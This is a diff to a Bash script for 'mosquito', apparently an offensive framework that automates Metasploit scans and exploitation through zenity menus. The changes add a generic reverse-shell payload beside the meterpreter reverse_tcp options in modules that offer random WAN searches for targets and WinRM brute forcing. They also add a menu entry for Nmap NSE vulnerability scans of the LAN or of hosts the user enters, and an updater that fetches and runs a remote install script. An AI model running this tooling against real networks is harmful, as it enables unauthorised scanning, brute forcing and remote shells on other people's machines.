@@ -12,7 +12,6 @@ resize -s 38 120 > /dev/nul
 # variable declarations _______________________________________
 #                                                             |
 OS=`uname`                                                    # grab OS
-ver="3.14.3"                                                  # mosquito  version
 SaIU=`arch`                                                   # grab arch in use
 IPATH=`pwd`                                                   # grab mosquito path
 htn=$(hostname)                                               # grab hostname
@@ -20,6 +19,7 @@ DiStRo=`awk '{print $1}' /etc/issue`                          # grab distributio
 user=`who | awk {'print $1'}`                                 # grab username
 EnV=`hostnamectl | grep Chassis | awk {'print $2'}`           # grab environement
 InT3R=`netstat -r | grep "default" | awk {'print $8'}`        # grab interface in use
+ver=$(cd bin && cat version | grep "=" | cut -d '=' -f2)      # mosquito  version
 RANGE=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'} | cut -d '.' -f1,2,3` # ip-range parsing
 # ____________________________________________________________|
 
@@ -82,6 +82,8 @@ while getopts ":h,:u,:i," opt; do
         u)
         cd aux
         rm -f install.sh > /dev/nul 2>&1
+        time=$(date | awk {'print $4'})
+        echo "${BlueF}[${YellowF}$time${BlueF}]${white} Downloading/updating installer .."${Reset};sleep 1
         wget -qq https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/install.sh
         chmod +x install.sh
         ./install.sh -u # update (install.sh -u)
@@ -293,7 +295,7 @@ sh_tree () {
    sleep 1
    IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
-   payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 195) > /dev/null 2>&1
+   payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" FALSE "generic/shell_reverse_tcp" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 220) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -478,7 +480,7 @@ sh_seven () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} winrm_brute resource_"${Reset};
    sleep 1
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
-   payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 195) > /dev/null 2>&1
+   payload=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "\nSellect exploitation Payload:" --radiolist --column "Pick" --column "Option" FALSE "generic/shell_reverse_tcp" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_tcp" --width 353 --height 220) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
    # Sellect the type of scan to use
@@ -838,26 +840,36 @@ sh_quatorze () {
 
 
 sh_easter_egg () {
-echo "${BlueF}[${YellowF}running${BlueF}]:${white} 🦟easter_egg🦟 ${BlueF}:[${YellowF}BlueTeam${BlueF}]${white}"${Reset};
+echo "${BlueF}[${YellowF}running${BlueF}]:${white} 🦟Nmap nse quick scans🦟 ${BlueF}[${YellowF}top-ports${BlueF}]"${Reset};
 sleep 1
 
 ## Local variable declarations
 IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
-scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" TRUE "Scan $IPADDR" --width 330 --height 180) > /dev/null 2>&1
+scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" TRUE "Scan Local Lan (fast)" FALSE "Scan Local Lan (discovery)" FALSE "Scan Local Lan (vulns)" FALSE "Scan User Input Host(s)" --width 330 --height 220) > /dev/null 2>&1
 
-   if [ "$scan" = "Scan Local Lan" ]; then
+   ## Scan Local Lan (fast)
+   if [ "$scan" = "Scan Local Lan (fast)" ]; then
+      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
+      msfconsole -q -x "workspace -a mosquito;db_nmap -sn $RANGE.0/24;hosts -C address,name,os_name,purpose,info;workspace -d mosquito"
+   ## Scan Local Lan (nse discovery categorie)
+   elif [ "$scan" = "Scan Local Lan (discovery)" ]; then
+      echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
+      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports 1000 --open --script=nbstat.nse,smb-os-discovery.nse,smb-enum-shares.nse,smb-vuln-regsvc-dos.nse,telnet-ntlm-info.nse,ssl-ccs-injection.nse,http-slowloris-check.nse,http-mobileversion-checker.nse $RANGE.0/24;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
+   ## Scan Local Lan (nse vuln categorie)
+   elif [ "$scan" = "Scan Local Lan (vulns)" ]; then
       echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
       msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports 1000 --open --script=vuln $RANGE.0/24;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $RANGE.0/24;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
-   elif [ "$scan" = "Scan $IPADDR" ]; then
-      echo "${BlueF}[☠]${white} Scanning Local Machine: $IPADDR🦟"${Reset};
-      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports 1000 --open --script=vuln $IPADDR;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $IPADDR;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
+   ## Scan User Input Host(s) (nse vuln categorie)
+   elif [ "$scan" = "Scan User Input Host(s)" ]; then
+      rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 192.168.1.71 192.168.1.254" --width 450) > /dev/null 2>&1
+      echo "${BlueF}[☠]${white} Scanning Local Machine: $rhost🦟"${Reset};
+      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports 1000 --open --script=vuln $rhost;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $rhost;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
    else
+      ## None option selected ..aborting..
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
    fi
 }
-
-
 
 
 
@@ -910,6 +922,7 @@ cat << !
     ║   14     ║     rtsp_url_brute    ║   scan for remote live webcam's url's  ║
     ╠──────────╩───────────────────────╩────────────────────────────────────────╣
     ║    E     -     Exit mosquito                                              ║
+    ║    N     -     Nmap nse quick scans                                       ║
     ╚───────────────────────────────────────────────────────────────────────────╣
 !
 echo "                                                           🦟${BlueF}SSA${YellowF}©${RedF}RedTeam${YellowF}@${BlueF}2019${white}🦟─╝"${Reset};
@@ -961,8 +974,8 @@ case $choice in
 14)
     sh_quatorze  # RTSP (webcams) function
 ;;
-easter_egg)
-    ## Mosquito Hidden option
+n|N)
+    ## Mosquito Nmap nse quick scans
     # whitehat - search for vuln's/cve's in local lan
     sh_easter_egg
 ;;
